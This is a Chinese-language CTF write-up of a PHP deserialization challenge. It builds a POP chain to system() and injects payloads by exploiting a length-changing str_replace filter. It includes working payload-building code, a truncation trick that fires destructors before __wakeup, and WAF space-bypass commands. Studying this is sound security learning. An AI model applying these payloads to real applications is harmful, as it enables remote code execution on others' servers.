# 极客大挑战（SYC） · Geek_Challenge2026（PHP 反序列化）

> 环境：PHP（本地 7.4 / 8.2 复现；目标未访问）
> 日期：2026-10-23
> 状态：本地打通，未上目标
> flag：未记录

## 一、源码结构

入口只有一处：

```php
if (isset($_GET['user']) && isset($_GET['sign'])) {
    $entry = new A($_GET['user'], $_GET['sign']);
    $ser = serialize($entry);
    $escaped = filter($ser);
    unserialize($escaped);
}
```

`filter()` 是 `str_replace("admin", "hacker", $data)`。六个类各有一个魔术方法，刚好串成一条链：

| 类 | 魔术方法 | 关键行为 |
|---|---|---|
| A | `__destruct` | `echo $this->sign`，对象会被转字符串 |
| B | `__wakeup` | 把 `action` 置空，**拦路虎** |
| B | `__toString` | `action` 可调用时执行 `$func()` |
| C | `__invoke` | `target` 有 `__call` 且方法不存在时，调 `$target->$method()` |
| D | `__call` | 返回 `$next->$property`，触发 `__get` |
| E | `__get` | `sink instanceof F` 时，写 `$sink->flag_trigger = $cmd` |
| F | `__set` | `flag_trigger` 赋值时 `system($value)` |

终点是 `F::__set` 的 `system($value)`，所以整题是「从 sink 倒推 POP 链 + 绕过 `__wakeup`」。

## 二、POP 链

从终点往回推：

| 跳 | 触发点 | 要满足的条件 | 下一跳 |
|---|---|---|---|
| 1 | `A::__destruct` | `sign` 是对象 | `B::__toString` |
| 2 | `B::__toString` | `action` 是对象且有 `__invoke` | `C::__invoke` |
| 3 | `C::__invoke` | `target` 有 `__call`，`method` 不存在 | `D::__call` |
| 4 | `D::__call` | `next` 是对象，`property` 是字符串 | `E::__get` |
| 5 | `E::__get` | `sink` 是 `F` 实例 | `F::__set` |
| 6 | `F::__set` | `name === 'flag_trigger'` | `system($value)` |

对象图：

```php
$f = new F();
$e = new E(); $e->sink = $f; $e->cmd = 'cat /flag';
$d = new D(); $d->next = $e; $d->property = 'y';
$c = new C(); $c->target = $d; $c->method = 'x';
$b = new B(); $b->action = $c;
```

两个「必须不存在」：

- `C->method` 不能是 `D` 已有的方法，否则 `method_exists()` 为真，直接 return。
- `D->property` 不能是 `E` 已有的 `sink` / `cmd`，否则不触发 `__get`。

## 三、拦路虎：B::__wakeup

正常 `unserialize` 的顺序是：先解析属性，再调用 `__wakeup`，最后才轮到 `A::__destruct`。所以 `B::__wakeup` 会把 `action` 置空，链在第二跳断掉。

关键实验：手工把 `serialize($b)` 末尾的 `}` 删掉，再塞进 A，观察析构顺序：

```php
$s = 'O:1:"A":1:{s:4:"sign";O:1:"B":1:{s:6:"action";...;';  // B 未闭合
@unserialize($s);
```

输出顺序会变成：

```
A::__destruct
B::__toString（action 还在）
...
B::__wakeup（已经晚了）
```

原因：`unserialize` 解析失败时会清理已经创建了一半的对象，**析构函数照跑**；而 B 的 `}` 还没读到，`__wakeup` 还没执行。也就是说：

> 不需要绕过 `__wakeup` 本身，只要让 `unserialize` 在「A->sign 已经指向 B」之后、「B 的 `}`」之前失败。

## 四、filter 的长度把戏

线上不可能直接交一个「少一个 `}`」的串，因为 `serialize(new A($u,$s))` 永远是合法的。破局点在 `filter`：

```php
$escaped = str_replace("admin", "hacker", $ser);
```

`serialize` 给字符串写的是 `s:<len>:"内容";`，`<len>` 是**替换前**的长度。`admin` 5 字节变 `hacker` 6 字节，内容长了 1，但 `<len>` 不变。

`unserialize` 读字符串时只读 `<len>` 个字节，于是**实际内容末尾多出来的字节会被当成序列化语法**。

设字符串里有 N 个 `admin`，就多出 N 个字节。把注入块放在字符串末尾，并让 N 等于注入块长度：

```
serialize(A) = O:1:"A":2:{s:4:"user";s:<LU>:"[admin × N][注入块]";s:4:"sign";...}
filter 之后  = s:<LU>:"[hacker × N][注入块]...
unserialize  = 读 <LU> 字节 → 正好是 hacker × N
               剩下 N 字节 = 注入块，按语法解析
```

注入块的设计：

```
";                      闭合 user 字符串
s:4:"sign";             第二个属性
O:1:"B":1:{...;          serialize($b) 去掉最后一个 }
```

也就是：

```php
$inject = '";s:4:"sign";' . substr(serialize($b), 0, -1);
$u = str_repeat('admin', strlen($inject)) . $inject;
$s = 'x';
```

几个约束：

- **注入到 `user`，不要注入 `sign`**。A 只声明了 2 个属性；`user` 后面注入的 `sign` 正好是第 2 个，属性计数满足。如果注入到 `sign` 后面，解析器已经读满 2 个属性，不会再接受第 3 个。
- `str_repeat` 的次数必须等于 `strlen($inject)`，因为每个 `admin` 只多出 1 字节。
- `$inject` 里不能出现 `admin`，否则会被二次替换，长度又乱。
- B 的 `}` 必须去掉：解析器在 B 内部遇到原始串尾部的 `";}` 时失败，此时 `action` 已赋值、`__wakeup` 未执行。

## 五、本地验证

先 `new` 出链，直接 `(string)$b`，确认 `system` 能执行；再走 `serialize` / `str_replace` / `unserialize`：

```php
$escaped = str_replace('admin', 'hacker', serialize(new A($u, $s)));
@unserialize($escaped);
```

本地 PHP 8.2 的输出顺序：

```
A::__destruct
B::__toString
C::__invoke
D::__call
E::__get
RCE: <命令输出>
B::__wakeup
```

看到 `RCE` 在 `B::__wakeup` 之前，就说明链通了。

## 六、踩过的坑

| 坑 | 现象 | 原因 / 解决 |
|---|---|---|
| 注入到 `sign` 后面 | 只输出一长串 `hackerhacker...` | A 的属性计数已经满足，第三个属性不被解析；改注入 `user` |
| `str_repeat` 次数和注入块长度不等 | 注入块被截断或错位 | N 必须等于 `strlen($inject)` |
| 注入块里带了 `admin` | 长度又被改 | 注入块里不能出现 `admin` |
| B 的 `}` 没删 | 先看到 `wakeup`，链断 | 必须让 B 停在未闭合状态 |
| 用 PHP 5.x 本地测 | `wakeup` 先于 `toString` | 失败清理行为不同；用 7.4 / 8.x 复现 |
| 线上看不到报错 | 页面只有源码 | `error_reporting(0)`；本地开 `E_ALL` 调试 |
| 命令里有空格被 WAF 拦 | 没有回显 | 试 `cat</flag`、`tac`、`nl`、`sort`，或用 `%09` 代替空格 |

## 七、可复用的方法

1. **POP 链从 sink 倒推**：先找 `system` / `file_get_contents` 这类终点，再问「谁调用它」「谁调用谁」，一直倒推到 `__destruct` / `__toString`。
2. **`__wakeup` 不一定要绕过**：让 `unserialize` 在它之前失败，利用失败清理的析构顺序，是另一条路。
3. **`serialize` 的长度字段是信任边界**：任何「先序列化、再对字符串做替换」的逻辑，只要替换改变长度，就可能被注入。
4. **属性计数也是约束**：注入的属性必须卡在对象声明的属性数量内，否则解析器不认。
5. **本地复现优先**：`new` 链 → 正常 `unserialize` → 截断 → 过滤替换，一层层加变量，比直接怼目标快得多。

## 附：和 CVE-2016-7124 的区别

这题用的**不是**「属性数量写大跳过 `__wakeup`」那个老 CVE。那条路在 PHP 7.0.10 / 5.6.25 之后已经修了，本地 PHP 8.2 实测 `O:1:"B":2:{...}` 直接返回 `false`。

这里利用的是**解析失败后的清理路径**：对象没解析完，`__wakeup` 没机会执行，但已经挂到 A->sign 上的半成品对象会在析构时被用到。两条路的共同点是「让 `__wakeup` 晚于析构」，实现手段不同。
